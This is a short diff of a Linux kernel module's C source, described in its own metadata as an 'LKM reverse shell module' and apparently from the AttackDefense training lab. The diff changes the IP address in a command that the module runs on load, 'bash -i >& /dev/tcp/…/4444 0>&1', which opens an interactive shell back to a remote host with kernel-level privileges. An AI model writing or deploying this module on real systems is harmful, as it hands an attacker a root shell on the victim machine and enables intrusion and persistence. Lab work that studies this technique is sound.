@@ -6,7 +6,7 @@ MODULE_AUTHOR("AttackDefense");
 MODULE_DESCRIPTION("LKM reverse shell module");
 MODULE_VERSION("1.0");
 
-char* argv[] = {"/bin/bash","-c","bash -i >& /dev/tcp/192.168.50.5/4444 0>&1", NULL};
+char* argv[] = {"/bin/bash","-c","bash -i >& /dev/tcp/192.168.56.5/4444 0>&1", NULL};
 static char* envp[] = {"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin", NULL };
 
 static int __init reverse_shell_init(void) {
